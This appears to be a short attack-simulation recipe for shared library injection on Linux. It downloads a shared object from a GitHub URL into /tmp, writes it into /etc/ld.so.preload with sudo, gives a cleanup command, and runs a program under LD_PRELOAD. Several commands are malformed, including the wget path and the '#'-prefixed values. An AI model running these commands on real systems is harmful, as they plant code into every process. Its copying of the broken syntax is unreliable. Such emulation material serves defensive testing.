  
 wget -P /tmp/https://github.com/jage1nf/testlib/blob/main/inject_lib.so  
  
1. Shared Library Injection via /etc/ld.so.preload  
Attack Commands:  
sudo sh -c 'echo /tmp/inject_lib.so > /etc/ld.so.preload'  
Cleanup Commands:  
sudo sed -i 's##/tmp/inject_lib.so##' /etc/ld.so.preload  
  
2. Shared Library Injection via LD_PRELOAD  
Attack Commands:  
LD_PRELOAD=#/tmp/inject_lib.so ls  
